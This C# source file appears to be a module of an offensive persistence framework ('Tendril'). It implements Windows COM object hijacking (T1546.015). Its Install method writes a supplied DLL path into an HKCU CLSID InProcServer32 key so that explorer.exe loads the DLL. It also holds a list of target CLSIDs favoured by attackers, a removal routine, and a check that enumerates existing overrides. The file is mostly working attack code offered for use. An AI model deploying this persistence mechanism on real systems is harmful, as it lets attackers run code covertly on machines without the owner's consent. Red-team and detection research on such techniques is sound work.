using System;
using System.Collections.Generic;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// COM Object Hijacking (T1546.015)
    ///
    /// Registers a malicious DLL under an HKCU CLSID that takes precedence over
    /// the HKLM registration. When a process (typically explorer.exe) instantiates
    /// the COM object, the attacker DLL loads instead.
    ///
    /// HKCU write - no admin required. DLL must proxy original exports to avoid
    /// breaking the host process (use DLL proxying or a lightweight shim).
    ///
    /// Observed: APT28 Operation Neusploit (2026) - EhStorShell.dll COM hijack
    ///           into explorer.exe with DLL proxying + steganography payload.
    /// </summary>
    public class ComHijack : ITendril
    {
        // CLSIDs commonly loaded by explorer.exe - good hijack candidates
        // Each maps to a COM server DLL that explorer loads on startup
        private static readonly Dictionary<string, string> KnownTargets = new Dictionary<string, string>
        {
            // MMDeviceEnumerator - audio subsystem, loaded early
            { "{BCDE0395-E52F-467C-8E3D-C4579291692E}", "MMDevApi.dll" },
            // CAccPropServices - accessibility, loaded by explorer
            { "{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}", "oleacc.dll" },
            // Shell Folder Band - explorer shell extension
            { "{fbeb8a05-beee-4442-804e-409d6c4515e9}", "explorerframe.dll" },
            // Enhanced Storage Shell Extension - APT28 favorite
            { "{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}", "EhStorShell.dll" },
        };

        public string Name { get { return "ComHijack"; } }
        public string Description { get { return "HKCU COM object hijacking - DLL loads in explorer.exe context"; } }
        public string MitreId { get { return "T1546.015"; } }
        public bool RequiresAdmin { get { return false; } }
        public bool IsReconOnly { get { return false; } }

        private const string BaseRegPath = @"Software\Classes\CLSID";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string clsid, dllPath, threadingModel;
            if (!options.TryGetValue("clsid", out clsid))
                clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"; // default: MMDeviceEnumerator

            if (!options.TryGetValue("payload", out dllPath))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing required option: /payload:<path_to_dll>");

            if (!options.TryGetValue("threading", out threadingModel))
                threadingModel = "Both";

            string keyPath = BaseRegPath + @"\" + clsid + @"\InProcServer32";

            // Write the CLSID InProcServer32 to HKCU - takes precedence over HKLM
            bool ok = RegistryUtils.SetRegValue("HKCU", keyPath, "", dllPath);
            if (!ok)
                return new TendrilResult(ResultStatus.Failed, Name, "Failed to write HKCU CLSID key");

            RegistryUtils.SetRegValue("HKCU", keyPath, "ThreadingModel", threadingModel);

            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("COM hijack installed for CLSID {0}", clsid))
                .WithMeta("CLSID", clsid)
                .WithMeta("DLL", dllPath)
                .WithMeta("Key", @"HKCU\" + keyPath);
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string clsid;
            if (!options.TryGetValue("clsid", out clsid))
                clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}";

            string keyPath = BaseRegPath + @"\" + clsid;

            bool ok = RegistryUtils.DeleteRegKeyTree("HKCU", keyPath);
            if (!ok)
                return new TendrilResult(ResultStatus.Failed, Name, "Failed to remove CLSID key (may not exist)");

            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("COM hijack removed for CLSID {0}", clsid))
                .WithMeta("CLSID", clsid);
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();

            // Check each known hijackable CLSID for existing HKCU overrides
            foreach (var target in KnownTargets)
            {
                string keyPath = BaseRegPath + @"\" + target.Key + @"\InProcServer32";
                string value = RegistryUtils.GetRegValue("HKCU", keyPath, "");
                if (!string.IsNullOrEmpty(value))
                {
                    results.Add(new TendrilResult(ResultStatus.Info, Name,
                        string.Format("HKCU COM override found for {0}", target.Key))
                        .WithMeta("CLSID", target.Key)
                        .WithMeta("OriginalDLL", target.Value)
                        .WithMeta("CurrentDLL", value)
                        .WithMeta("Key", @"HKCU\" + keyPath));
                }
            }

            // Also enumerate all HKCU\Software\Classes\CLSID entries
            string[] subkeys = RegistryUtils.GetRegSubkeys("HKCU", BaseRegPath);
            foreach (string subkey in subkeys)
            {
                string inproc = RegistryUtils.GetRegValue("HKCU", BaseRegPath + @"\" + subkey + @"\InProcServer32", "");
                if (!string.IsNullOrEmpty(inproc) && !KnownTargets.ContainsKey(subkey))
                {
                    results.Add(new TendrilResult(ResultStatus.Info, Name,
                        string.Format("Custom HKCU COM override: {0}", subkey))
                        .WithMeta("CLSID", subkey)
                        .WithMeta("DLL", inproc));
                }
            }

            return results;
        }
    }
}
